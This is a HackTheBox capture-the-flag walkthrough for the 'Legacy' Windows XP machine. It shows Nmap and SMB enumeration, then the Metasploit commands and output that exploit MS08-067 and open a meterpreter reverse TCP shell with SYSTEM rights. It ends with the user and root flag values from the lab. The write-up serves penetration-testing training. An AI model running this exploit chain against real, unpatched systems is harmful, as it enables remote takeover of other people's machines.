# HackTheBox Legacy Walkthrough

This is a Walkthrough how I get the user and root flag on the machine. All my scan results are stored in the [attachments](./attachments) folder.

achine details:

- Machine Name: Legacy
- IP address: 10.10.10.4
- OS: Windows
- Difficulty: Easy

## Scanning

In this table I summarize the open ports and protocols and the XML version of the full results.

| Scan Type         | Open Ports/Protocols | XML Output File                                |
|-------------------|----------------------|------------------------------------------------|
| Nmap IP Scan      | 1 (ICMP)             | [ip_legacy.xml](./attachments/ip_legacy.xml)   |
| Nmap TCP SYN Scan | 139, 445             | [tcp_legacy.xml](./attachments/tcp_legacy.xml) |
| Nmap UDP Scan     | 137                  | [udp_legacy.xml](./attachments/udp_legacy.xml) |

## Enumeration

### OS Enumeration

The Nmap OS detection found 94% match for Microsoft Windows XP SP3.

### SMB Enumeration

```bash
root@Kali:/# msfconsole

               .;lxO0KXXXK0Oxl:.
           ,o0WMMMMMMMMMMMMMMMMMMKd,
        'xNMMMMMMMMMMMMMMMMMMMMMMMMMWx,
      :KMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMK:
    .KMMMMMMMMMMMMMMMWNNNWMMMMMMMMMMMMMMMX,
   lWMMMMMMMMMMMXd:..     ..;dKMMMMMMMMMMMMo
  xMMMMMMMMMMWd.               .oNMMMMMMMMMMk
 oMMMMMMMMMMx.                    dMMMMMMMMMMx
.WMMMMMMMMM:                       :MMMMMMMMMM,
xMMMMMMMMMo                         lMMMMMMMMMO
NMMMMMMMMW                    ,cccccoMMMMMMMMMWlccccc;
MMMMMMMMX                     ;KMMMMMMMMMMMMMMMMMMX:
NMMMMMMMMW.                      ;KMMMMMMMMMMMMMMX:
xMMMMMMMMMd                        ,0MMMMMMMMMMK;
.WMMMMMMMMMc                         'OMMMMMM0,
 lMMMMMMMMMMk.                         .kMMO'
  dMMMMMMMMMMWd'                         ..
   cWMMMMMMMMMMMNxc'.                ##########
    .0MMMMMMMMMMMMMMMMWc            #+#    #+#
      ;0MMMMMMMMMMMMMMMo.          +:+
        .dNMMMMMMMMMMMMo          +#++:++#+
           'oOWMMMMMMMMo                +:+
               .,cdkO0K;        :+:    :+:
                                :::::::+:
                      Metasploit

       =[ metasploit v5.0.101-dev                         ]
+ -- --=[ 2048 exploits - 1105 auxiliary - 344 post       ]
+ -- --=[ 566 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

etasploit tip: Open an interactive Ruby terminal with irb

msf5 > use auxiliary/scanner/smb/smb_version
msf5 auxiliary(scanner/smb/smb_version) > show options

odule options (auxiliary/scanner/smb/smb_version):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   SMBDomain  .                no        The Windows domain to use for authentication
   SMBPass                     no        The password for the specified username
   SMBUser                     no        The username to authenticate as
   THREADS    1                yes       The number of concurrent threads (max one per host)

msf5 auxiliary(scanner/smb/smb_version) > set RHOSTS 10.10.10.4
RHOSTS => 10.10.10.4
msf5 auxiliary(scanner/smb/smb_version) > exploit

[+] 10.10.10.4:445        - Host is running Windows XP SP3 (language:English) (name:LEGACY) (workgroup:HTB ) (signatures:optional)
[*] 10.10.10.4:445        - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

### Searching Vulnerabilities

I google for [smb windows xp sp3 exploit](https://www.google.com/search?q=smb+windows+xp+sp3+exploit&oq=smb+xp+sp&aqs=chrome.1.69i57j0l7.6303j0j7&sourceid=chrome&ie=UTF-8). The first finding is a Metasploit module for [MS08-067 Microsoft Server Service Relative Path Stack Corruption](https://www.rapid7.com/db/modules/exploit/windows/smb/ms08_067_netapi)

## Exploit

I use the found module with staged meterpreter reverse TCP shell. The meterpreter session already has SYSTEM privilege so the only think left is to find the user and root flag on the machine.

```bash
msf5 auxiliary(scanner/smb/smb_version) > use exploit/windows/smb/ms08_067_netapi
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf5 exploit(windows/smb/ms08_067_netapi) > show options

odule options (exploit/windows/smb/ms08_067_netapi):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT    445              yes       The SMB service port (TCP)
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.0.5      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Targeting


msf5 exploit(windows/smb/ms08_067_netapi) > set RHOSTS 10.10.10.4
RHOSTS => 10.10.10.4
msf5 exploit(windows/smb/ms08_067_netapi) > set LHOST 10.10.14.23
LHOST => 10.10.14.23
msf5 exploit(windows/smb/ms08_067_netapi) > exploit

[*] Started reverse TCP handler on 10.10.14.23:4444
[*] 10.10.10.4:445 - Automatically detecting the target...
[*] 10.10.10.4:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] 10.10.10.4:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] 10.10.10.4:445 - Attempting to trigger the vulnerability...
[*] Sending stage (176195 bytes) to 10.10.10.4
[*] Meterpreter session 1 opened (10.10.14.23:4444 -> 10.10.10.4:1031) at 2020-08-20 19:22:30 +0000

meterpreter > pwd
C:\WINDOWS\system32
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > cat C:\\Documents\ and\ Settings\\john\\Desktop\\user.txt
e69af0e4f443de7e36876fda4ec7644f
meterpreter >
meterpreter > cat C:\\Documents\ and\ Settings\\Administrator\\Desktop\\root.txt
993442d258b0e0ec917cae9e695d5713
meterpreter >
```

